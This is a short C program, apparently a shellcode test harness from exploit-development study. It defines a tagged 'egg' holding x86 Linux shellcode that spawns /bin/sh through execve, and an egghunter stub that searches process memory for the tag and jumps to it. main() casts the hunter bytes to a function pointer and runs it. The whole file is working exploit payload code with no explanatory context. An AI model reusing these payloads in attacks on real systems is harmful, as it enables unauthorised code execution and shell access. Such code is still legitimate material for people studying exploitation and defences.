#include<stdio.h>
#include<string.h>

unsigned char egg[] =  "\x37\x13\xcd\xab\x37\x13\xcd\xab\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
unsigned char egghunter[] = "\x31\xc0\x89\xc1\x89\xc2\xbe\x37\x13\xcd\xab\x66\x81\xca\xff\x0f\x42\x8d\x5a\x08\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x74\xed\x39\x32\x75\xee\x39\x72\x04\x75\xe9\x8d\x52\x08\xff\xe2";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(egghunter));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
